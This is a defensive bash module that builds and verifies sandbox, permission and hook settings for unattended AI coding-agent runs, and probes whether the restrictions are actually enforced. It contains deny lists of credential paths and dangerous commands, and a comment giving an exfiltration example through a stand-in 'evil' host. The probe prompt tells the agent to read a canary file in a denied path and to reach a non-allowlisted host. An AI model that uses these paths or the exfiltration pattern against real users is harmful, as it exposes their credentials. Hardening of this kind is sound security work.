#!/usr/bin/env bash
# relay-settings.sh — builds the inline --settings payload and PROVES it is
# enforced before any real work runs.
#
# This is the highest-risk file in relay. Everything protecting the user's
# credentials is decided here, and `claude -p` will silently ignore a settings
# payload that fails validation (verified; see docs/security.md). A typo, or a
# schema change in a future Claude Code release, would therefore hand us a
# six-hour unattended run with NO sandbox and NO deny rules while the journal
# cheerfully reported "guardrails active".
#
# So this module never assumes. It asserts, against observable behaviour, and
# refuses to start when it cannot prove enforcement.
#
# Every sandbox key used below was empirically confirmed enforced on Claude Code
# 2.1.233 by test/lint/probe0-sandbox.sh. Keys are added here only after a probe
# demonstrates they do something.

set -u
set -o pipefail
umask 077
LC_ALL=C
IFS=$' \t\n'

# ---------------------------------------------------------------------------
# Flags relay must never pass, and must always pass.
# ---------------------------------------------------------------------------
# --dangerously-skip-permissions : would void every deny rule.
# --bare                         : skips hooks (kills the context guard) and is
#                                  reserved exclusively for --hardened mode.
# --no-session-persistence       : destroys the transcript the guard reads.
# --safe-mode                    : disables ALL customizations, including relay's
#                                  own hooks, while permissions "work normally".
#                                  It is a troubleshooting flag, not a sandbox.
# Forbidden: --dangerously-skip-permissions, --bare, --no-session-persistence,
#            --safe-mode
# Required:  --setting-sources, --strict-mcp-config
#
# Verified Critical (docs/security.md): without BOTH required flags, a cloned
# repo's .claude/settings.json hook executes and its .mcp.json loads, with no
# trust prompt, under -p.
#
# These lists live in the `case` statement in relay_settings_assert_argv rather
# than in variables. A string variable would have to be word-split to match,
# splitting behaves differently across shells, and a guard that silently
# degrades to matching nothing is worse than no guard at all.

# Paths whose contents must never be readable by sandboxed commands.
relay_settings_default_denyread() {
  cat <<'EOF'
~/.ssh
~/.aws
~/.gnupg
~/.config/gcloud
~/.kube
~/.docker
~/.npmrc
~/.netrc
~/.claude/.credentials.json
~/Library/Keychains
EOF
}

# Under `--permission-mode dontAsk`, anything not explicitly allowed is REFUSED
# rather than proceeded with — verified, probe0-permission-mode.sh case A. A
# payload carrying only a deny list therefore produces a session that cannot
# write a single file: relay's first real run spent an entire session budget
# and wrote nothing, its result envelope listing a denied Write followed by a
# denied `cat > file` Bash fallback. No mock-based test could have caught this,
# because the mock has no permission layer to get wrong.
#
# So the allow list is not a convenience — it is what makes a session able to
# work at all. Breadth here is deliberate and consistent with the threat model:
# the sandbox is the boundary, and `deny` still takes precedence over `allow`
# (case D), so the blast-radius layer below is untouched by this list.
relay_settings_default_allow() {
  cat <<'EOF'
Read
Write
Edit
Glob
Grep
Bash
BashOutput
KillShell
Task
Agent
TodoWrite
NotebookEdit
Skill
SlashCommand
EOF
}

# Blast-radius reduction for the agent's own mistakes. NOT a security boundary:
# an attacker controlling repository content defeats command-pattern matching
# trivially (absolute paths, other binaries, language runtimes, DNS,
# `git ls-remote https://evil/$(base64 secret)`). The sandbox is the boundary.
# Documented as such in the README; kept because it genuinely stops accidents.
relay_settings_default_deny() {
  cat <<'EOF'
Bash(sudo:*)
Bash(su:*)
Bash(doas:*)
Bash(rm -rf /*)
Bash(rm -rf ~*)
Bash(git push:*)
Bash(git remote:*)
Bash(git reset --hard:*)
Bash(git clean:*)
Bash(git filter-branch:*)
Bash(gh:*)
Bash(glab:*)
Bash(hub:*)
Bash(npm publish:*)
Bash(yarn publish:*)
Bash(pnpm publish:*)
Bash(cargo publish:*)
Bash(docker:*)
Bash(kubectl:*)
Bash(terraform apply:*)
Bash(aws:*)
Bash(gcloud:*)
Bash(shutdown:*)
Bash(reboot:*)
Bash(launchctl:*)
Bash(systemctl:*)
Bash(crontab:*)
Bash(at:*)
Bash(security:*)
Bash(defaults write:*)
Bash(chmod -R 777:*)
Bash(chown -R:*)
WebFetch
WebSearch
Read(~/.ssh/**)
Read(~/.aws/**)
Read(~/.gnupg/**)
Read(~/.config/gh/**)
Read(**/.env*)
Read(**/*.pem)
Read(**/id_rsa*)
Read(**/id_ed25519*)
EOF
}

# The original design denied *reads* of credential paths but left *writes*
# unguarded. Writing ~/.claude/settings.json is persistent RCE on every future
# session; writing ~/.ssh/authorized_keys is persistent host access; writing a
# shell rc is both. These close that gap.
relay_settings_default_deny_writes() {
  cat <<'EOF'
Write(~/.claude/**)
Edit(~/.claude/**)
Write(~/.ssh/**)
Edit(~/.ssh/**)
Write(~/.aws/**)
Edit(~/.aws/**)
Write(~/.zshrc)
Edit(~/.zshrc)
Write(~/.bashrc)
Edit(~/.bashrc)
Write(~/.profile)
Edit(~/.profile)
Write(~/.zprofile)
Edit(~/.zprofile)
EOF
}

# ---------------------------------------------------------------------------
# relay_settings_build <project_dir> <state_dir> <hook_path> [extra_domains_csv]
# Emits the complete inline --settings JSON on stdout.
# ---------------------------------------------------------------------------
relay_settings_build() {
  _proj="${1:?project dir required}"
  _state="${2:?state dir required}"
  _hook="${3:?hook path required}"
  _extra_domains="${4:-}"

  # api.anthropic.com is required or the session cannot talk to the API at all.
  #
  # Assembled as lines through a pipe, not by string concatenation: command
  # substitution strips the trailing newline, so appending one $(...) to another
  # glued the first extra domain onto api.anthropic.com and destroyed BOTH
  # ("api.anthropic.comregistry.npmjs.org"). That went unnoticed because no
  # caller ever passed an extra domain. `awk '!seen'` de-duplicates while
  # preserving order, so listing api.anthropic.com again is harmless.
  _domains_json=$(
    { printf 'api.anthropic.com\n'
      if [ -n "$_extra_domains" ]; then printf '%s\n' "$_extra_domains" | tr ',' '\n'; fi
    } | grep -v '^[[:space:]]*$' | awk '!seen[$0]++' | jq -R . | jq -s .
  ) || return 1
  [ -n "$_domains_json" ] || return 1

  jq -nc \
    --arg proj "$_proj" \
    --arg state "$_state" \
    --arg hook "$_hook" \
    --arg tmp "${TMPDIR:-/tmp}" \
    --argjson domains "$_domains_json" \
    --argjson denyread "$(relay_settings_default_denyread | jq -R . | jq -s .)" \
    --argjson allow "$(relay_settings_default_allow | jq -R . | jq -s .)" \
    --argjson deny "$( { relay_settings_default_deny; relay_settings_default_deny_writes; } | jq -R . | jq -s .)" \
    '
    {
      # ---- the actual credential protection -----------------------------
      sandbox: {
        enabled: true,
        # Default is false, and on failure commands run UNSANDBOXED with only a
        # warning. Relay would rather not run at all.
        failIfUnavailable: true,
        # Ignore the per-call dangerouslyDisableSandbox escape hatch entirely.
        allowUnsandboxedCommands: false,
        autoAllowBashIfSandboxed: true,
        network: {
          # Deterministic deny for anything not listed, enforced at the OS
          # layer, so it also covers code relay never sees (a python urllib
          # call buried inside `npm test` is blocked exactly like curl).
          allowedDomains: $domains
        },
        filesystem: {
          allowWrite: [ $proj, $state, $tmp ],
          denyRead: $denyread
        }
      },
      # ---- what the session may do, and what it may never do ------------
      # `allow` exists because dontAsk refuses anything unlisted; `deny` is
      # blast-radius reduction and wins over `allow`. Both verified.
      permissions: { allow: $allow, deny: $deny },
      # ---- relay context guard, scoped to THIS session only -------------
      # Delivered per-invocation rather than registered globally, so relay
      # ships zero hooks that run in anyone else'"'"'s sessions. Exec form keeps
      # a path containing spaces from being re-parsed by a shell.
      hooks: {
        PostToolUse: [
          { hooks: [ { type: "command", command: "bash", args: [ $hook ], timeout: 5 } ] }
        ],
        PreCompact: [
          { hooks: [ { type: "command", command: "bash", args: [ $hook, "--precompact" ], timeout: 5 } ] }
        ]
      }
    }'
}

# ---------------------------------------------------------------------------
# relay_settings_assert_argv <argv...>
# Refuse to exec if relay ever builds a command line that voids its own
# protections. Belt to the mock test harness's braces.
# ---------------------------------------------------------------------------
relay_settings_assert_argv() {
  _seen_setting_sources=0
  _seen_strict_mcp=0
  for _a in "$@"; do
    # Matched with `case`, not by word-splitting a string variable: splitting
    # behaves differently across shells (zsh does not split unquoted
    # expansions by default), and a guard that silently degrades to "matches
    # nothing" is worse than no guard at all. This form cannot degrade.
    case "$_a" in
      --dangerously-skip-permissions|--bare|--no-session-persistence|--safe-mode)
        printf 'relay: refusing to exec: forbidden flag %s\n' "$_a" >&2
        return 1
        ;;
      --setting-sources)   _seen_setting_sources=1 ;;
      --strict-mcp-config) _seen_strict_mcp=1 ;;
    esac
  done
  if [ "$_seen_setting_sources" -ne 1 ] || [ "$_seen_strict_mcp" -ne 1 ]; then
    printf 'relay: refusing to exec: missing --setting-sources and/or --strict-mcp-config\n' >&2
    printf 'relay: without both, a repository .claude/settings.json executes under -p\n' >&2
    return 1
  fi
  return 0
}

# ---------------------------------------------------------------------------
# relay_settings_egress_host <settings_json>
#
# Pick a host the probe can legitimately treat as "outside the allowlist".
# Almost always example.com; the candidates exist because `allow_domains` is
# user-configurable, and probing a host the user deliberately allowlisted would
# report the sandbox as broken when it is working perfectly.
# ---------------------------------------------------------------------------
relay_settings_egress_host() {
  _egh_settings="${1:-}"
  _egh_allowed=$(printf '%s' "$_egh_settings" \
    | jq -r '(.sandbox.network.allowedDomains // [])[]' 2>/dev/null)
  for _egh_c in example.com example.net example.org; do
    if ! printf '%s\n' "$_egh_allowed" | grep -qx -- "$_egh_c"; then
      printf '%s\n' "$_egh_c"
      unset _egh_settings _egh_allowed _egh_c
      return 0
    fi
  done
  unset _egh_settings _egh_allowed _egh_c
  return 1
}

# ---------------------------------------------------------------------------
# relay_settings_egress_verdict <file>
#
# Read the egress attempt's own output and print exactly one of:
#   reachable    — a non-allowlisted host answered. The sandbox is NOT confining
#                  network egress, and relay must refuse to run.
#   blocked      — the request failed, which is what an enforced allowlist looks
#                  like from inside.
#   inconclusive — the probe session did not produce a readable result (no curl
#                  on the box, the model did not run the command, a truncated
#                  file). Not proof of anything, in either direction.
#
# Kept separate from the probe itself precisely so it can be unit-tested against
# fixture files with zero API calls — the probe around it cannot be.
#
# The contract with the probe command: the file holds curl's `%{http_code}`
# followed by a line reading `rc=<exit status>`.
# ---------------------------------------------------------------------------
relay_settings_egress_verdict() {
  _egv_file="${1:-}"
  if [ ! -f "$_egv_file" ]; then
    printf 'inconclusive\n'
    unset _egv_file
    return 0
  fi

  _egv_rc=$(grep -o 'rc=[0-9][0-9]*' "$_egv_file" 2>/dev/null | tail -1 | cut -d= -f2)
  _egv_code=$(grep -oE '[0-9][0-9][0-9]' "$_egv_file" 2>/dev/null | head -1)

  case "$_egv_rc" in
    ''|*[!0-9]*)
      # No exit status means the command never ran to completion; a bare status
      # code without one is not enough to convict the sandbox.
      printf 'inconclusive\n'
      unset _egv_file _egv_rc _egv_code
      return 0
      ;;
  esac

  if [ "$_egv_rc" -eq 0 ] && [ -n "$_egv_code" ] && [ "$_egv_code" != "000" ]; then
    printf 'reachable\n'
  else
    # A non-zero curl status, or the 000 curl prints when it never got a
    # response, is the signature of a blocked connection.
    printf 'blocked\n'
  fi
  unset _egv_file _egv_rc _egv_code
  return 0
}

# ---------------------------------------------------------------------------
# relay_settings_probe <settings_json> <scratch_dir> [model]
#
# Positively confirm the payload is enforced, in one session, by asserting two
# things the sandbox is supposed to make true:
#   * a filesystem.denyRead path is genuinely unreadable, and
#   * a host outside network.allowedDomains is genuinely unreachable.
#
# The second assertion used to be missing while this comment claimed it — the
# probe tested the canary only, so relay started six-hour unattended runs having
# proven half of what it said it proved. Found by relay auditing its own
# documentation against its own source during the phase 5 run.
#
# Asymmetry, deliberate: a readable canary and a reachable host both REFUSE the
# run, but an egress result relay cannot interpret does not. "Blocked" and "we
# could not tell" are different claims, and there is no honest way to turn the
# second into the first. `curl` is not one of relay's dependencies, so a box
# without it would otherwise be unable to run relay at all — while the canary,
# which needs nothing but the filesystem, has already proven the sandbox is on.
# The inconclusive case is journaled so it is visible rather than assumed.
#
# The canary is relay-owned scratch. The user's real credentials are never
# used as a test subject.
#
# Note there is deliberately no "control" (sandbox-off) case at runtime — that
# would mean intentionally leaking a canary on the user's machine. The control
# lives in the test suite, which proves this probe *can* observe a leak.
# ---------------------------------------------------------------------------
relay_settings_probe() {
  _settings="${1:?settings json required}"
  _scratch="${2:?scratch dir required}"
  _model="${3:-haiku}"

  _work="$_scratch/probe-work"
  _canary="$_scratch/probe-canary.txt"
  _netfile="$_scratch/probe-egress.txt"
  _value="RELAY-PROBE-CANARY-DO-NOT-LEAK-$$"

  rm -rf "$_work"
  rm -f "$_netfile"
  mkdir -p "$_work" || return 1
  printf '%s\n' "$_value" > "$_canary" || return 1

  _host=$(relay_settings_egress_host "$_settings") || _host=""

  # Rebuild the payload with our canary appended to denyRead, so we are testing
  # the caller's real configuration plus one observable assertion.
  _probe_settings=$(printf '%s' "$_settings" \
    | jq -c --arg c "$_canary" '.sandbox.filesystem.denyRead += [$c]') || return 1

  # The egress command writes its own evidence to a file rather than being
  # reported back in prose: the verdict must come from curl's exit status, not
  # from a model's summary of it.
  _prompt="Use the Bash tool to run exactly: cat $_canary"
  if [ -n "$_host" ]; then
    _prompt="$_prompt
Then use the Bash tool to run exactly: curl -sS -m 10 https://$_host -o /dev/null -w '%{http_code}' > $_netfile 2>&1; echo \"rc=\$?\" >> $_netfile
Then reply with what the first command printed, or BLOCKED if it failed."
  else
    _prompt="$_prompt
Then reply with what you saw, or BLOCKED if it failed."
  fi

  (
    cd "$_work" || exit 1
    CLAUDE_CODE_PRINT_BG_WAIT_CEILING_MS=0 \
    claude -p "$_prompt" \
      --model "$_model" \
      --permission-mode dontAsk \
      --setting-sources user \
      --strict-mcp-config \
      --settings "$_probe_settings" \
      --output-format json \
      --max-budget-usd 0.10 \
      < /dev/null > "$_scratch/probe-read.json" 2> "$_scratch/probe-read.err"
  )

  if grep -qF "$_value" "$_scratch/probe-read.json" "$_scratch/probe-read.err" 2>/dev/null; then
    printf 'relay: SANDBOX NOT ENFORCED — a denyRead canary was readable.\n' >&2
    printf 'relay: refusing to run. See docs/security.md.\n' >&2
    return 1
  fi

  # Confirm the sandbox actually started rather than the read merely failing
  # for an unrelated reason (missing file, model refusal, budget exhaustion).
  if ! jq -e '.is_error == false' < "$_scratch/probe-read.json" >/dev/null 2>&1; then
    printf 'relay: settings acceptance probe did not complete cleanly; refusing to run.\n' >&2
    return 1
  fi

  if [ -n "$_host" ]; then
    _egress=$(relay_settings_egress_verdict "$_netfile")
    relay_journal "probe.egress" "$_egress host=$_host"
    if [ "$_egress" = "reachable" ]; then
      printf 'relay: SANDBOX NOT ENFORCED — %s answered from inside the sandbox\n' "$_host" >&2
      printf 'relay: while network.allowedDomains does not list it.\n' >&2
      printf 'relay: refusing to run. See docs/security.md.\n' >&2
      return 1
    fi
  fi

  return 0
}

# ---------------------------------------------------------------------------
# relay_settings_fingerprint <settings_json>
# Cache key for the probe result: the payload plus the CLI version. A Claude
# Code upgrade may move the settings schema, so a version change must force a
# fresh proof rather than trusting yesterday's.
# ---------------------------------------------------------------------------
relay_settings_fingerprint() {
  _s="${1:?}"
  _v=$(claude --version 2>/dev/null | tr -cd 'A-Za-z0-9.() ')
  printf '%s\n%s\n' "$_v" "$_s" | git hash-object --stdin 2>/dev/null
}
